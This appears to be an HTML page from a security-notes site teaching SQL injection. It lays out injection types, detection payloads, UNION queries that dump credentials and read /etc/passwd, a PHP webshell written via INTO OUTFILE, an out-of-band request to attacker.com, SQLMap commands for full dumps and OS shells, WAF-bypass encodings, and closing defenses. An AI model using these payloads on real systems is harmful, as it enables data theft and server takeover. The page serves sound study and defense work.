@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en" style="background-color:#020202">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Injection - Security Hub</title>
+    <meta name="description"
+        content="Complete SQL Injection reference — types, detection, exploitation, SQLMap, WAF bypass, and defenses.">
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    <link rel="stylesheet" href="../css/style.css">
+    <style>
+        .type-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+
+        .type-card {
+            background: var(--bg-surface-hover);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 1.25rem;
+            transition: all .25s;
+        }
+
+        .type-card:hover {
+            transform: translateY(-3px);
+            border-color: rgba(239, 68, 68, .3);
+        }
+
+        .type-card .tc-icon {
+            font-size: 1.6rem;
+            margin-bottom: .6rem;
+            display: block;
+        }
+
+        .type-card h3 {
+            font-family: 'Outfit', sans-serif;
+            font-size: .95rem;
+            font-weight: 600;
+            margin: 0 0 .4rem;
+        }
+
+        .type-card p {
+            font-size: .82rem;
+            color: var(--text-soft);
+            margin: 0;
+            line-height: 1.5;
+        }
+
+        .danger-box {
+            background: rgba(239, 68, 68, .06);
+            border: 1px solid rgba(239, 68, 68, .2);
+            border-radius: 10px;
+            padding: 1rem 1.2rem;
+            margin: .75rem 0;
+            display: flex;
+            gap: .75rem;
+            align-items: flex-start;
+        }
+
+        .danger-box i {
+            color: #ef4444;
+            font-size: 1.1rem;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .danger-box p {
+            font-size: .875rem;
+            color: var(--text-soft);
+            margin: 0;
+            line-height: 1.55;
+        }
+
+        .tip-box {
+            background: rgba(16, 185, 129, .06);
+            border: 1px solid rgba(16, 185, 129, .2);
+            border-radius: 10px;
+            padding: 1rem 1.2rem;
+            margin: .75rem 0;
+            display: flex;
+            gap: .75rem;
+            align-items: flex-start;
+        }
+
+        .tip-box i {
+            color: #10b981;
+            font-size: 1.1rem;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .tip-box p {
+            font-size: .875rem;
+            color: var(--text-soft);
+            margin: 0;
+            line-height: 1.55;
+        }
+
+        .step-list {
+            list-style: none;
+            padding: 0;
+            margin: 1rem 0;
+            counter-reset: step;
+        }
+
+        .step-list li {
+            counter-increment: step;
+            display: flex;
+            gap: .85rem;
+            margin-bottom: .9rem;
+            align-items: flex-start;
+        }
+
+        .step-list li::before {
+            content: counter(step);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            min-width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            background: rgba(239, 68, 68, .12);
+            border: 1px solid rgba(239, 68, 68, .3);
+            color: #f87171;
+            font-size: .75rem;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+
+        .step-list li p {
+            font-size: .875rem;
+            color: var(--text-soft);
+            margin: 0;
+            line-height: 1.55;
+        }
+
+        .payload-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: .85rem;
+            margin-top: 1rem;
+        }
+
+        .payload-card {
+            background: rgba(7, 9, 14, .7);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            padding: .9rem 1rem;
+        }
+
+        .payload-card .pc-label {
+            font-size: .68rem;
+            text-transform: uppercase;
+            letter-spacing: .1em;
+            color: var(--text-muted);
+            font-weight: 600;
+            margin-bottom: .5rem;
+        }
+
+        .payload-card code {
+            font-family: 'Fira Code', monospace;
+            font-size: .83rem;
+            color: #f87171;
+            word-break: break-all;
+            display: block;
+            line-height: 1.5;
+        }
+
+        .defense-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            gap: .85rem;
+            margin-top: 1rem;
+        }
+
+        .defense-card {
+            background: rgba(16, 185, 129, .05);
+            border: 1px solid rgba(16, 185, 129, .15);
+            border-radius: 10px;
+            padding: 1rem;
+        }
+
+        .defense-card i {
+            font-size: 1.3rem;
+            color: #34d399;
+            margin-bottom: .5rem;
+            display: block;
+        }
+
+        .defense-card h4 {
+            font-family: 'Outfit', sans-serif;
+            font-size: .88rem;
+            font-weight: 600;
+            margin: 0 0 .3rem;
+            color: var(--text-main);
+        }
+
+        .defense-card p {
+            font-size: .8rem;
+            color: var(--text-soft);
+            margin: 0;
+            line-height: 1.5;
+        }
+    </style>
+    <script>if (localStorage.getItem('theme') === 'light-mode') document.documentElement.classList.add('light-mode');</script>
+</head>
+
+<body>
+    <button class="mobile-toggle" id="mobile-toggle"><i class="ph-list"></i></button>
+    <aside class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <h2><i class="ph-shield-warning"></i> SecNotes</h2>
+        </div>
+        <nav class="sidebar-nav">
+            <div class="nav-section">
+                <ul class="nav-list">
+                    <li class="nav-item"><a href="../index.html"><i class="ph-house"></i> Home Dashboard</a></li>
+                </ul>
+            </div>
+            <div class="nav-section">
+                <div class="section-title">linux</div>
+                <ul class="nav-list">
+                    <li class="nav-item"><a href="../linux/index.html"><i class="ph-linux-logo"></i> Linux Overview</a>
+                    </li>
+                    <li class="nav-item"><a href="../linux/file-permissions.html"><i class="ph-key"></i> File
+                            Permissions</a></li>
+                    <li class="nav-item"><a href="../linux/processes.html"><i class="ph-cpu"></i> Processes</a></li>
+                    <li class="nav-item"><a href="../linux/package-management.html"><i class="ph-package"></i> Package
+                            Management</a></li>
+                    <li class="nav-item"><a href="../linux/networking-commands.html"><i class="ph-wifi-high"></i>
+                            Networking Commands</a></li>
+                </ul>
+            </div>
+            <div class="nav-section">
+                <div class="section-title">bash</div>
+                <ul class="nav-list">
+                    <li class="nav-item"><a href="../bash/index.html"><i class="ph-terminal-window"></i> Bash
+                            Overview</a></li>
+                    <li class="nav-item"><a href="../bash/basics.html"><i class="ph-code"></i> Basics</a></li>
+                    <li class="nav-item"><a href="../bash/loops.html"><i class="ph-arrows-clockwise"></i> Loops</a></li>
+                    <li class="nav-item"><a href="../bash/conditionals.html"><i class="ph-git-branch"></i>
+                            Conditionals</a></li>
+                    <li class="nav-item"><a href="../bash/one-liners.html"><i class="ph-magic-wand"></i> One Liners</a>
+                    </li>
+                </ul>
+            </div>
+            <div class="nav-section">
+                <div class="section-title">networking</div>
+                <ul class="nav-list">
+                    <li class="nav-item"><a href="../networking/index.html"><i class="ph-globe-hemisphere-west"></i>
+                            Networking Overview</a></li>
+                    <li class="nav-item"><a href="../networking/osi-model.html"><i class="ph-stack"></i> OSI Model</a>
+                    </li>
+                    <li class="nav-item"><a href="../networking/tcp-ip.html"><i class="ph-share-network"></i> TCP/IP</a>
+                    </li>
+                    <li class="nav-item"><a href="../networking/dns.html"><i class="ph-book-bookmark"></i> DNS</a></li>
+                    <li class="nav-item"><a href="../networking/http-https.html"><i class="ph-lock-key"></i>
+                            HTTP/HTTPS</a></li>
+                    <li class="nav-item"><a href="../networking/ports-protocols.html"><i class="ph-plugs"></i> Ports
+                            &amp; Protocols</a></li>
+                </ul>
+            </div>
+            <div class="nav-section">
+                <div class="section-title">web security</div>
+                <ul class="nav-list">
+                    <li class="nav-item"><a href="../web-security/index.html"><i class="ph-shield-check"></i> Web
+                            Security</a></li>
+                    <li class="nav-item"><a href="../web-security/sqli.html" class="active"><i class="ph-database"></i>
+                            SQL Injection</a></li>
+                    <li class="nav-item"><a href="../web-security/xss.html"><i class="ph-browser"></i> XSS</a></li>
+                    <li class="nav-item"><a href="../web-security/authentication.html"><i class="ph-password"></i>
+                            Authentication</a></li>
+                    <li class="nav-item"><a href="../web-security/session-management.html"><i class="ph-cookie"></i>
+                            Session Management</a></li>
+                </ul>
+            </div>
+            <div class="nav-section">
+                <div class="section-title">privilege escalation</div>
+                <ul class="nav-list">
+                    <li class="nav-item"><a href="../privilege-escalation/index.html"><i class="ph-trend-up"></i>
+                            Privilege Escalation</a></li>
+                    <li class="nav-item"><a href="../privilege-escalation/linux-privesc-basics.html"><i
+                                class="ph-ladder"></i> Linux PrivEsc Basics</a></li>
+                </ul>
+            </div>
+            <div class="nav-section">
+                <div class="section-title">tools</div>
+                <ul class="nav-list">
+                    <li class="nav-item"><a href="../tools/index.html"><i class="ph-toolbox"></i> Tools Overview</a>
+                    </li>
+                    <li class="nav-item"><a href="../tools/nmap.html"><i class="ph-radar"></i> Nmap</a></li>
+                    <li class="nav-item"><a href="../tools/wireshark.html"><i class="ph-wave-sine"></i> Wireshark</a>
+                    </li>
+                    <li class="nav-item"><a href="../tools/burpsuite.html"><i class="ph-spider"></i> Burp Suite</a></li>
+                    <li class="nav-item"><a href="../tools/metasploit.html"><i class="ph-skull"></i> Metasploit</a></li>
+                </ul>
+            </div>
+            <div class="theme-toggle-wrapper"><button id="theme-toggle" class="theme-toggle"><i class="ph-sun"></i>
+                    Light Mode</button></div>
+        </nav>
+    </aside>
+
+    <div class="main-wrapper">
+        <main class="content">
+            <div class="content-header">
+                <div class="breadcrumb"><i class="ph-folder-open"></i> Web Security <i class="ph-caret-right"></i> SQL
+                    Injection</div>
+                <h1>SQL Injection</h1>
+                <p>SQL Injection (SQLi) is consistently ranked in the <strong>OWASP Top 10</strong> and remains one of
+                    the most critical and widespread web vulnerabilities. It allows attackers to interfere with the
+                    queries an application makes to its database — reading, modifying, or deleting data they should
+                    never have access to.</p>
+            </div>
+
+            <!-- What is SQLi -->
+            <div class="card">
+                <h2><i class="ph-info"></i> What is SQL Injection?</h2>
+                <p>SQL Injection occurs when <strong>user-supplied input is incorporated into a SQL query without proper
+                        sanitization</strong>. The attacker injects malicious SQL code that changes the logic of the
+                    query, causing the database to execute unintended commands.</p>
+
+                <p><strong>Vulnerable code example (PHP):</strong></p>
+                <div class="code-wrapper">
+                    <div class="code-header"><span class="code-lang">php — Vulnerable Query</span><button
+                            class="copy-btn" onclick="copyCode(this)"><i class="ph-copy"></i> Copy</button></div>
+                    <pre><code>// VULNERABLE — user input directly in query
+$username = $_GET['username'];
+$query = "SELECT * FROM users WHERE username = '$username'";
+$result = mysqli_query($conn, $query);
+
+// If user sends:  admin'--
+// Query becomes:  SELECT * FROM users WHERE username = 'admin'--'
+// The -- comments out the rest — password check bypassed!</code></pre>
+                </div>
+
+                <div class="danger-box"><i class="ph-warning-circle"></i>
+                    <p><strong>Impact:</strong> Authentication bypass, full database dump, reading server files, writing
+                        webshells, and in some configs even OS command execution via stored procedures like <code
+                            class="inline">xp_cmdshell</code> (MSSQL).</p>
+                </div>
+            </div>
+
+            <!-- Types -->
+            <div class="card">
+                <h2><i class="ph-tree-structure"></i> Types of SQL Injection</h2>
+                <p>SQLi is broadly categorized by how the attacker receives feedback from the database:</p>
+                <div class="type-grid">
+                    <div class="type-card">
+                        <span class="tc-icon" style="color:#ef4444;"><i class="ph-eye"></i></span>
+                        <h3>In-Band — Error Based</h3>
+                        <p>The database error message is returned directly in the HTTP response. Fastest to exploit —
+                            the error message leaks table names, column names, and data directly. Example: <code
+                                class="inline">CONVERT(int, (SELECT TOP 1 name FROM sysobjects))</code></p>
+                    </div>
+                    <div class="type-card">
+                        <span class="tc-icon" style="color:#f59e0b;"><i class="ph-rows"></i></span>
+                        <h3>In-Band — Union Based</h3>
+                        <p>Uses the <code class="inline">UNION</code> SQL keyword to append a second SELECT query whose
+                            results are returned in the same HTTP response. Requires knowing the number and data types
+                            of columns. Most common CTF technique.</p>
+                    </div>
+                    <div class="type-card">
+                        <span class="tc-icon" style="color:#8b5cf6;"><i class="ph-eye-slash"></i></span>
+                        <h3>Blind — Boolean Based</h3>
+                        <p>No data returned in the response, but the application behaves differently based on TRUE/FALSE
+                            conditions. Attacker extracts data one bit at a time by asking yes/no questions: <code
+                                class="inline">AND SUBSTRING(username,1,1)='a'</code></p>
+                    </div>
+                    <div class="type-card">
+                        <span class="tc-icon" style="color:#0ea5e9;"><i class="ph-timer"></i></span>
+                        <h3>Blind — Time Based</h3>
+                        <p>No visible difference in the response at all. Instead, the attacker causes the server to
+                            sleep for a set time to confirm TRUE/FALSE: <code class="inline">IF(1=1, SLEEP(5), 0)</code>
+                            — if the response takes 5 seconds, the condition is true.</p>
+                    </div>
+                    <div class="type-card">
+                        <span class="tc-icon" style="color:#10b981;"><i
+                                class="ph-arrows-out-line-horizontal"></i></span>
+                        <h3>Out-of-Band (OOB)</h3>
+                        <p>Data is exfiltrated via a different channel — like DNS lookups or HTTP requests to an
+                            attacker-controlled server. Used when other techniques fail: <code
+                                class="inline">LOAD_FILE('\\\\attacker.com\\share')</code></p>
+                    </div>
+                    <div class="type-card">
+                        <span class="tc-icon" style="color:#fb7185;"><i class="ph-database"></i></span>
+                        <h3>Second Order (Stored)</h3>
+                        <p>Malicious input is <em>stored</em> in the database first (seemingly safe), then executed
+                            later when another part of the application uses it in a query. Harder to detect than
+                            first-order injection.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Detection -->
+            <div class="card">
+                <h2><i class="ph-magnifying-glass"></i> Detection — Finding SQLi</h2>
+                <p>Test every user-controllable input: GET/POST parameters, HTTP headers (User-Agent, X-Forwarded-For,
+                    Cookie), JSON/XML body fields.</p>
+                <div class="code-wrapper">
+                    <div class="code-header"><span class="code-lang">payloads — Basic Detection</span><button
+                            class="copy-btn" onclick="copyCode(this)"><i class="ph-copy"></i> Copy</button></div>
+                    <pre><code># Step 1: Cause a syntax error — look for database error in response
+'
+''
+`
+')
+"))
+';--
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+
+# Step 2: Boolean test — does behavior change?
+' AND '1'='1     (should behave normally)
+' AND '1'='2     (should return empty/different result)
+
+# Step 3: Time-based confirmation
+'; IF(1=1) WAITFOR DELAY '0:0:5'--        (MSSQL)
+' AND SLEEP(5)--                           (MySQL)
+' AND pg_sleep(5)--                        (PostgreSQL)
+'||pg_sleep(5)--                           (PostgreSQL alt)</code></pre>
+                </div>
+
+                <h3 style="font-size:1rem; margin-top:1.5rem; font-family:'Outfit',sans-serif;">Finding the Column Count
+                    (for UNION)</h3>
+                <div class="code-wrapper">
+                    <div class="code-header"><span class="code-lang">sql — Column Enumeration</span><button
+                            class="copy-btn" onclick="copyCode(this)"><i class="ph-copy"></i> Copy</button></div>
+                    <pre><code># Method 1: ORDER BY — increment until error
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--   (error here = 2 columns)
+
+# Method 2: UNION SELECT NULLs — increment until no error
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+# Find which columns are string-type (visible in output)
+' UNION SELECT 'a',NULL,NULL--
+' UNION SELECT NULL,'a',NULL--
+' UNION SELECT NULL,NULL,'a'--</code></pre>
+                </div>
+            </div>
+
+            <!-- UNION Exploitation -->
+            <div class="card">
+                <h2><i class="ph-rows"></i> UNION-Based Exploitation</h2>
+                <div class="code-wrapper">
+                    <div class="code-header"><span class="code-lang">sql — MySQL UNION Exploitation</span><button
+                            class="copy-btn" onclick="copyCode(this)"><i class="ph-copy"></i> Copy</button></div>
+                    <pre><code># Get database version
+' UNION SELECT NULL,@@version,NULL--
+
+# Get current database name
+' UNION SELECT NULL,database(),NULL--
+
+# Get current user
+' UNION SELECT NULL,user(),NULL--
+
+# List all databases
+' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--
+
+# List tables in current database
+' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
+
+# List columns in a specific table
+' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+
+# Dump usernames + passwords
+' UNION SELECT NULL,concat(username,':',password),NULL FROM users--
+
+# Read server files (requires FILE privilege)
+' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--
+
+# Write a webshell (requires write permissions)
+' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--</code></pre>
+                </div>
+            </div>
+
+            <!-- Blind SQLi -->
+            <div class="card">
+                <h2><i class="ph-eye-slash"></i> Blind SQLi — Manual Extraction</h2>
+                <div class="code-wrapper">
+                    <div class="code-header"><span class="code-lang">sql — Boolean Blind (MySQL)</span><button
+                            class="copy-btn" onclick="copyCode(this)"><i class="ph-copy"></i> Copy</button></div>
+                    <pre><code># Extract DB name length
+' AND LENGTH(database())=6--     (try 1,2,3... until TRUE)
+
+# Extract DB name character by character
+' AND SUBSTRING(database(),1,1)='d'--   (position 1, char 'd')
+' AND SUBSTRING(database(),2,1)='b'--   (position 2, char 'b')
+' AND SUBSTRING(database(),3,1)='_'--   (position 3, char '_')
+
+# Extract using ASCII values (avoids quote issues)
+' AND ASCII(SUBSTRING(database(),1,1))>64--
+' AND ASCII(SUBSTRING(database(),1,1))>96--
+' AND ASCII(SUBSTRING(database(),1,1))=100-- (100 = 'd')
+
+# Time-based confirmation (when no visual difference)
+' AND IF(ASCII(SUBSTRING(database(),1,1))=100, SLEEP(3), 0)--</code></pre>
+                </div>
+            </div>
+
+            <!-- SQLMap -->
+            <div class="card">
+                <h2><i class="ph-terminal-window"></i> SQLMap — Automated Exploitation</h2>
+                <p>SQLMap is the gold-standard tool for automated SQLi detection and exploitation. It handles all types,
+                    fingerprints the DB, and dumps data automatically.</p>
+                <div class="code-wrapper">
+                    <div class="code-header"><span class="code-lang">bash — SQLMap Cheatsheet</span><button
+                            class="copy-btn" onclick="copyCode(this)"><i class="ph-copy"></i> Copy</button></div>
+                    <pre><code># Basic scan on a GET parameter
+sqlmap -u "http://target.com/page.php?id=1"
+
+# POST request
+sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"
+
+# Specify parameter to test
+sqlmap -u "http://target.com/page.php?id=1&cat=2" -p id
+
+# Use session cookie
+sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"
+
+# Set request from Burp file
+sqlmap -r request.txt
+
+# Enumerate databases
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+
+# Enumerate tables in specific database
+sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables
+
+# Enumerate columns in a table
+sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --columns
+
+# Dump specific columns
+sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users -C username,password --dump
+
+# Dump entire database
+sqlmap -u "http://target.com/page.php?id=1" --dump-all
+
+# OS shell (if permissions allow)
+sqlmap -u "http://target.com/page.php?id=1" --os-shell
+
+# Try to get a Meterpreter shell
+sqlmap -u "http://target.com/page.php?id=1" --os-pwn
+
+# Use level/risk for more aggressive testing
+sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
+
+# Use a tamper script to bypass WAF
+sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,between</code></pre>
+                </div>
+            </div>
+
+            <!-- WAF Bypass -->
+            <div class="card">
+                <h2><i class="ph-shield-slash"></i> WAF &amp; Filter Bypass Techniques</h2>
+                <p>When a Web Application Firewall blocks your payloads, use these evasion techniques:</p>
+                <div class="payload-grid">
+                    <div class="payload-card">
+                        <div class="pc-label">Case Variation</div><code>SeLeCt * FrOm UsErS</code>
+                    </div>
+                    <div class="payload-card">
+                        <div class="pc-label">Comment Insertion</div><code>SE/**/LECT/**/ * FR/**/OM users</code>
+                    </div>
+                    <div class="payload-card">
+                        <div class="pc-label">URL Encoding</div><code>%27%20OR%20%271%27%3D%271</code>
+                    </div>
+                    <div class="payload-card">
+                        <div class="pc-label">Double URL Encode</div><code>%2527 (double encode the ')</code>
+                    </div>
+                    <div class="payload-card">
+                        <div class="pc-label">Hex Encoding</div><code>0x61646d696e (hex for 'admin')</code>
+                    </div>
+                    <div class="payload-card">
+                        <div class="pc-label">Whitespace Alternatives</div><code>SELECT%09*%09FROM%09users (tab)</code>
+                    </div>
+                    <div class="payload-card">
+                        <div class="pc-label">OR alternatives</div><code>|| (pipe) instead of OR</code>
+                    </div>
+                    <div class="payload-card">
+                        <div class="pc-label">Equal alternatives</div><code>LIKE 'admin' instead of ='admin'</code>
+                    </div>
+                    <div class="payload-card">
+                        <div class="pc-label">SQLMap tampers</div><code>--tamper=between,bluecoat,charencode</code>
+                    </div>
+                    <div class="payload-card">
+                        <div class="pc-label">Scientific notation</div><code>1e0 instead of 1 (MySQL)</code>
+                    </div>
+                </div>
+            </div>
+
+            <!-- DB Fingerprinting -->
+            <div class="card">
+                <h2><i class="ph-fingerprint"></i> Database Fingerprinting</h2>
+                <p>Different databases have different syntax. Identify the backend DB to use correct payloads:</p>
+                <div class="code-wrapper">
+                    <div class="code-header"><span class="code-lang">sql — DB Identification Payloads</span><button
+                            class="copy-btn" onclick="copyCode(this)"><i class="ph-copy"></i> Copy</button></div>
+                    <pre><code># MySQL
+SELECT @@version        -- returns version like 8.0.32-MySQL
+SELECT @@datadir        -- data directory
+SELECT USER()           -- current user
+SELECT database()       -- current database
+
+# MSSQL (Microsoft SQL Server)
+SELECT @@version        -- Microsoft SQL Server ...
+SELECT @@servername     -- server name
+SELECT USER_NAME()      -- current user
+SELECT DB_NAME()        -- current database
+EXEC xp_cmdshell('whoami')  -- OS command (if enabled)
+
+# PostgreSQL
+SELECT version()        -- PostgreSQL 14.5...
+SELECT current_user     -- current user
+SELECT current_database()  -- current DB
+COPY users TO '/tmp/out.txt'  -- write file
+
+# Oracle
+SELECT * FROM v$version   -- Oracle Database 19c...
+SELECT user FROM dual       -- current user
+SELECT global_name FROM global_name  -- DB name
+
+# SQLite
+SELECT sqlite_version()    -- 3.39.2
+SELECT name FROM sqlite_master WHERE type='table'  -- list tables</code></pre>
+                </div>
+            </div>
+
+            <!-- Defenses -->
+            <div class="card">
+                <h2><i class="ph-shield-check"></i> Defenses &amp; Mitigations</h2>
+                <div class="defense-grid">
+                    <div class="defense-card"><i class="ph-code"></i>
+                        <h4>Prepared Statements</h4>
+                        <p>The gold standard. Parameterized queries ensure user input is always treated as data, never
+                            as SQL code. <code class="inline">stmt.setString(1, input)</code></p>
+                    </div>
+                    <div class="defense-card"><i class="ph-funnel"></i>
+                        <h4>Input Validation</h4>
+                        <p>Whitelist allowed characters. Reject anything that doesn't match expected format — e.g.,
+                            numeric IDs should only accept digits.</p>
+                    </div>
+                    <div class="defense-card"><i class="ph-lock-key"></i>
+                        <h4>Least Privilege</h4>
+                        <p>The DB account the app uses should have only the permissions it needs — no DROP, no FILE,
+                            limited SELECT. Never run as root/sa.</p>
+                    </div>
+                    <div class="defense-card"><i class="ph-shield"></i>
+                        <h4>WAF (Web App Firewall)</h4>
+                        <p>ModSecurity, Cloudflare WAF, or AWS WAF can block SQLi patterns. Not a replacement for code
+                            fixes but adds a critical detection layer.</p>
+                    </div>
+                    <div class="defense-card"><i class="ph-eye"></i>
+                        <h4>Error Handling</h4>
+                        <p>Never expose DB error messages to users. Custom error pages prevent information leakage that
+                            aids exploitation.</p>
+                    </div>
+                    <div class="defense-card"><i class="ph-chart-line"></i>
+                        <h4>Logging &amp; Alerting</h4>
+                        <p>Log all database queries. Alert on anomalies — multiple errors, long queries, UNION keywords
+                            in production logs.</p>
+                    </div>
+                </div>
+                <div class="code-wrapper" style="margin-top:1.5rem;">
+                    <div class="code-header"><span class="code-lang">php — Secure Parameterized Query</span><button
+                            class="copy-btn" onclick="copyCode(this)"><i class="ph-copy"></i> Copy</button></div>
+                    <pre><code>// SECURE — using prepared statement (PDO)
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt->execute([$username, $password]);
+$user = $stmt->fetch();
+
+// SECURE — using MySQLi prepared statement
+$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt->bind_param("ss", $username, $password);
+$stmt->execute();</code></pre>
+                </div>
+                <div class="tip-box" style="margin-top:.75rem;"><i class="ph-check-circle"></i>
+                    <p><strong>Always:</strong> Prepared statements first, WAF second, error suppression third. Defense
+                        in depth — use all three together.</p>
+                </div>
+            </div>
+
+        </main>
+    </div>
+    <script src="../js/script.js"></script>
+</body>
+
+</html>
